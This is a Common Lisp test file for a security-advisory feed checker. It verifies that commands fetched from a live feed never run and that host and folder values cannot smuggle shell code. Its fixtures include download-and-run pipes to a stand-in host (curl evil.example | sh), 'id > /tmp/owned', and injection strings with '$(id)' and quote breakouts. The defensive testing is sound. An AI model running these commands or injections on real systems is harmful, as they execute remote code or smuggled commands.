;;;; run-test.lisp --- a fetched feed decides what is vulnerable, never what runs.
;;;;
;;;; SPDX-License-Identifier: MIT
;;;;
;;;; The live feed comes from main, which an unattended job writes from web
;;;; news. Each test hands the cell a live feed through the stubbed fetch and
;;;; reads every argv the stubbed runner was given (*SP-RAN*).

(in-package #:nodecode.test)

(defun sp-live (&rest checks)
  "Serve a live feed of one advisory carrying CHECKS (JSON texts), and load it."
  (setf *sp-fetch-answer*
        (list (format nil "{\"format\":1,\"updated\":\"2026-10-31T00:00:00Z\",\"advisories\":[{\"id\":\"live-1\",\"title\":\"Live\",\"severity\":\"critical\",\"checks\":[~{~a~^,~}]}]}" checks)
              200))
  (nodecode-cyber-security:load-feed :fetch t)
  (is (eq :remote (getf nodecode-cyber-security::*feed-state* :source)) "the live feed answered"))

(defun sp-live-results (&key dir host)
  "The live advisory's check results, run against the stubbed machine."
  (getf (first (nodecode-cyber-security:check :dir dir :host host)) :results))

(defun sp-ran-p (needle)
  "Some argv the runner was handed mentions NEEDLE."
  (some (lambda (argv) (some (lambda (word) (search needle word)) argv)) *sp-ran*))

(deftest cyber-security-a-fetched-command-never-runs (with-stubbed-security)
  (setf nodecode-cyber-security::*run* 'sp-run-logged)
  (let ((php "{\"kind\":\"version\",\"command\":[\"php\",\"-r\",\"echo PHP_VERSION;\"],\"fixed\":[\"8.3.36\"],\"backport\":[\"sh\",\"-c\",\"curl -s https://evil.example/b | sh\"]}"))
    (sp-pin (sp-check "{\"command\":[\"php\",\"-r\",\"echo PHP_VERSION;\"]}"))
    (sp-live "{\"kind\":\"version\",\"command\":[\"sh\",\"-c\",\"curl -s https://evil.example/v | sh\"],\"fixed\":[\"1.0\"]}"
             "{\"kind\":\"command\",\"command\":[\"bash\",\"-c\",\"id > /tmp/owned\"]}"
             php)
    (setf *sp-outputs* '(("sh:curl" "0.1" 0) ("bash" "uid=1000" 0) ("php" "8.3.6" 0)))
    (let ((results (sp-live-results)))
      (is (not (sp-ran-p "evil.example")) "no fetched script ran")
      (is (not (sp-ran-p "/tmp/owned")) "no fetched command ran")
      (is (eq :skipped (getf (first results) :status)) "a fetched version command is skipped")
      (is (eq :skipped (getf (second results) :status)) "a fetched command check is skipped")
      (is (search "nodecode update" (or (getf (first results) :why) "")) "the skip says what brings it")
      (is (eq :vulnerable (getf (third results) :status)) "the pinned php check still judges 8.3.6")
      (is (search "backport" (or (getf (third results) :why) "")) "and says its fetched backport check did not run")
      (is (equal '(("php" "-r" "echo PHP_VERSION;")) *sp-ran*) "the pinned command is the only one that ran"))))

(deftest cyber-security-a-pinned-command-runs-from-the-live-feed (with-stubbed-security)
  (setf nodecode-cyber-security::*run* 'sp-run-logged)
  (let ((node "{\"kind\":\"version\",\"line\":1,\"command\":[\"node\",\"-v\"],\"fixed\":[\"24.22.1\"]}"))
    (sp-pin (sp-check node))
    (sp-live node)
    (setf *sp-outputs* '(("node" "v24.1.0" 0)))
    (is (eq :vulnerable (getf (first (sp-live-results)) :status)) "new versions for a shipped command land live")
    (is (equal '(("node" "-v")) *sp-ran*))))

(deftest cyber-security-a-python-version-check-runs-as-a-probe (with-stubbed-security)
  (setf nodecode-cyber-security::*run* 'sp-run-logged)
  (flet ((py (name) (format nil "{\"kind\":\"version\",\"command\":[\"python3\",\"-c\",\"import importlib.metadata as m; print(m.version('~a'))\"],\"fixed\":[\"6.1.3\"]}" name)))
    (sp-live (py "pypdf") (py "x')); import os; os.system('id'); print(('"))
    (setf *sp-outputs* '(("python3" "6.0.0" 0)))
    (let ((results (sp-live-results)))
      (is (eq :vulnerable (getf (first results) :status)) "a new package's check lands live")
      (is (equal '(("python3" "-c" "import importlib.metadata as m, sys; print(m.version(sys.argv[1]))" "pypdf"))
                 *sp-ran*)
          "the name is an argument to our script, never code")
      (is (eq :skipped (getf (second results) :status)) "a name that is no package name runs nothing"))))

(deftest cyber-security-a-host-or-folder-cannot-close-its-quotes (with-stubbed-security)
  (setf nodecode-cyber-security::*run* 'sp-run-logged)
  (let ((tls (sp-check "{\"kind\":\"command\",\"needs\":\"host\",\"match\":\"(?i)emsign\",\"command\":[\"sh\",\"-c\",\"openssl s_client -connect '{host}:443'\"]}"))
        (grep (sp-check "{\"kind\":\"command\",\"needs\":\"dir\",\"command\":[\"sh\",\"-c\",\"grep -rl x '{dir}/wp-content'\"]}")))
    (sp-pin tls grep)
    (setf *sp-outputs* '(("sh:openssl" "issuer=CN = E7" 0) ("sh:grep" "" 0)))
    (let ((r (nodecode-cyber-security::run-check tls :host "example.com'; id > /tmp/owned; '")))
      (is (eq :skipped (getf r :status)))
      (is (search "is not a host name" (or (getf r :why) ""))))
    (let ((r (nodecode-cyber-security::run-check grep :dir "/srv/a'$(id)'")))
      (is (eq :skipped (getf r :status)))
      (is (search "shell character" (or (getf r :why) ""))))
    (is (null *sp-ran*) "neither ran")
    (is (eq :ok (getf (nodecode-cyber-security::run-check tls :host "example.com") :status)) "a host name runs")
    (is (eq :ok (getf (nodecode-cyber-security::run-check grep :dir "/srv/www/site") :status)) "a plain folder runs")
    (is (equal '("sh" "-c" "openssl s_client -connect 'example.com:443'") (second *sp-ran*)))))

(deftest cyber-security-every-shipped-check-may-run-in-its-own-copy ()
  (let ((refused '()))
    (dolist (a (nodecode-cyber-security::read-feed
                (uiop:read-file-string (nodecode-cyber-security::packaged-path))))
      (dolist (c (nodecode-cyber-security:field a "checks"))
        (dolist (key '("command" "backport"))
          (let ((words (nodecode-cyber-security:field c key)))
            (when words
              (multiple-value-bind (run why) (nodecode-cyber-security::runnable words nil nil)
                (unless run (push (format nil "~a ~a: ~a" (gethash "id" a) key why) refused))))))))
    (is (null refused) (format nil "the shipped feed runs as before:~{~%  ~a~}" refused))))

(deftest cyber-security-a-server-over-ssh-gets-only-vouched-commands (with-stubbed-security)
  (let ((node "{\"kind\":\"version\",\"label\":\"node\",\"command\":[\"node\",\"-v\"],\"fixed\":[\"24.22.1\"]}"))
    (sp-pin (sp-check node))
    (sp-live node "{\"kind\":\"command\",\"label\":\"evil\",\"command\":[\"sh\",\"-c\",\"curl https://evil.example | sh\"]}"
             "{\"kind\":\"npm\",\"package\":\"p\",\"fixed\":[\"1.0\"]}")
    (let ((rows (nodecode-cyber-security:commands "live-1")))
      (is (= 2 (length rows)) "one row per check that runs a program")
      (is (equal '("node" "-v") (getf (first rows) :run)) "the vouched command, as this copy runs it")
      (is (null (getf (second rows) :run)) "the fetched one is not handed out")
      (is (search "not run" (getf (second rows) :not-run))))))

(deftest cyber-security-the-job-publishes-no-new-command ()
  (flet ((feed (&rest checks)
           (format nil "{\"format\":1,\"updated\":\"2026-10-22T10:00:00Z\",\"advisories\":[{\"id\":\"x-1\",\"title\":\"X\",\"date\":\"2026-10-22\",\"severity\":\"high\",\"exploited\":false,\"summary\":\"s\",\"affected\":\"a\",\"patch\":[\"upgrade\"],\"sources\":[\"https://example.com/a\"],\"checks\":[~{~a~^,~}]}]}" checks)))
    (let ((php "{\"kind\":\"version\",\"command\":[\"php\",\"-r\",\"echo PHP_VERSION;\"],\"fixed\":[\"8.3.36\"]}")
          (py "{\"kind\":\"version\",\"command\":[\"python3\",\"-c\",\"import importlib.metadata as m; print(m.version('newpkg'))\"],\"fixed\":[\"2.0\"]}")
          (sh "{\"kind\":\"command\",\"command\":[\"sh\",\"-c\",\"curl https://evil.example | sh\"]}"))
      (is (null (nodecode-cyber-security:feed-problems (feed php py) :since (feed php)))
          "a shipped command and the Python probe pass the job's gate")
      (is (search "only a person publishes a new command"
                  (format nil "~{~a~}" (nodecode-cyber-security:feed-problems (feed php sh) :since (feed php))))
          "a new command fails it")
      (is (null (nodecode-cyber-security:feed-problems (feed php sh)))
          "a person, gating without :since, may publish it"))))
